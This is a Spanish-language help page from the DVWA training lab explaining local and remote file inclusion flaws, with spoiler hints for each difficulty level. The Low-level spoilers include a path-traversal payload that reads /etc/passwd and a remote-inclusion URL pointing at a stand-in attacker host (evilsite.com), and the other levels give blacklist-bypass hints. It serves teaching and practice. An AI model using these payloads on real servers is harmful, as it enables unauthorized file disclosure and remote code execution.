<div class="body_padded">
	<h1>Ayuda - Inclusión de Archivos</h1>

	<div id="code">
	<table width='100%' bgcolor='white' style="border:2px #C0C0C0 solid">
	<tr>
	<td><div id="code">
		<h3>Acerca de</h3>
		<p>Algunas aplicaciones web permiten al usuario especificar la entrada que se usa directamente en las transmisiones de archivos o permite al usuario subir archivos al servidor.
		Más adelante, la aplicación web accede a la entrada proporcionada por el usuario en el contexto de las aplicaciones web. Al hacer esto, la aplicación web está permitiendo
		el potencial de ejecución de archivos maliciosos.</p>

		<p>Si el archivo elegido para ser incluido es local en la máquina de destino, se llama "Inclusión de archivo local (LFI). Pero los archivos también se pueden incluir en otra
                  máquinas, que luego el ataque es una "Inclusión de archivo remoto (RFI).</p>

		<p>Cuando RFI no es una opción. el uso de otra vulnerabilidad con LFI (como la carga de archivos y el recorrido de directorios) a menudo puede lograr el mismo efecto.</p>

		<p>Tenga en cuenta que el término "inclusión de archivos" no es lo mismo que "acceso arbitrario a archivos" o "divulgación de archivos".</p>

		<br /><hr /><br />

		<h3>Objectivo</h3>
		<p>Lea todas las <u> cinco </u> citas famosas de'<a href="../hackable/flags/fi.php">../hackable/flags/fi.php</a>' usando solo la inclusión del archivo.</p>

		<br /><hr /><br />

		<h3>Nivel Low</h3>
		<p>Esto permite la entrada directa en <u> una de las muchas funciones PHP </u> que incluirá el contenido a ejecutar.</p>

		<p>Dependiendo de la configuración del servicio web, dependerá si RFI es una posibilidad.</p>
		<pre>Spoiler: <span class="spoiler">LFI: ?page=../../../../../../etc/passwd</span>.
			Spoiler: <span class="spoiler">RFI: ?page=http://www.evilsite.com/evil.php</span>.</pre>

		<br />

		<h3>Nivel Medium</h3>
		<p>El desarrollador ha leído algunos de los problemas con LFI / RFI, y decidió filtrar la entrada. Sin embargo, los patrones que se usan, no son suficientes.</p>
		<pre>Spoiler: <span class="spoiler">LFI: Es posible, debido a que solo filtra a través de patrón de coincidencia con listas negras</span>.
			Spoiler: <span class="spoiler">RFI: <?php echo dvwaExternalLinkUrlGet( 'https://secure.php.net/manual/en/wrappers.php', 'PHP Streams' ); ?></span>.</pre>

		<br />

		<h3>Nivel High</h3>
		<p>El desarrollador ha tenido suficiente. Decidieron permitir solo ciertos archivos para ser utilizados. Sin embargo, como hay varios archivos con el mismo nombre base,
                 usan un comodín para incluirlos a todos.</p>
		<pre>Spoiler: <span class="spoiler">LFI: el nombre de archivo solo ha comenzado con un cierto valor.</span>.
			Spoiler: <span class="spoiler">RFI: necesita vincular en otra vulnerabilidad, como carga de archivos</span>.</pre>

		<br />

		<h3>Nivel Impossible</h3>
		<p>El desarrollador solo codifica las páginas permitidas, con nombres de archivo exactos. Al hacer esto, elimina todas las avenidas de ataque.</p>
	</div></td>
	</tr>
	</table>

	</div>

	<br />

	<p>Referencia: <?php echo dvwaExternalLinkUrlGet( 'https://www.owasp.org/index.php/Top_10_2007-A3' ); ?></p>

</div>
